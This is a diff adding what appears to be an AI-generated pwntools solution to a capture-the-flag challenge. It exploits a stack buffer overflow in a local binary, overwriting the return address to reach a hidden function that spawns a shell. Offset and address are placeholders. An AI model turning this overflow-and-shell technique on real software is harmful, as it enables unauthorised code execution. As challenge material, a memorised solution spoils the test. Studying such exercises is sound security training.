@@ -1,0 +1,26 @@
+code(prefix='To solve this challenge using pwntools, we need to exploit the `vulnerable_function` which reads up to 256 bytes into a buffer of size 136. This can lead to a buffer overflow, allowing us to overwrite the return address and control the execution flow. We will aim to call the `not_called` function, which executes `/bin/bash` and gives us a shell.
+
+Steps:
+1. Identify the offset to the return address.
+2. Craft a payload that overwrites the return address with the address of `not_called`.
+3. Send the payload to the vulnerable function.
+4. Interact with the shell.', imports='from pwn import *', code="binary = './vulnerable_binary'
+
+# Start the process
+io = process(binary)
+
+# Find the offset to the return address
+offset = cyclic_find(0x61616161)  # Example offset, replace with actual value
+
+# Get the address of the 'not_called' function
+not_called_addr = p32(0x080484a4)  # Replace with the actual address
+
+# Craft the payload
+payload = b'A' * offset
+payload += not_called_addr
+
+# Send the payload
+io.sendline(payload)
+
+# Interact with the shell
+io.interactive()")
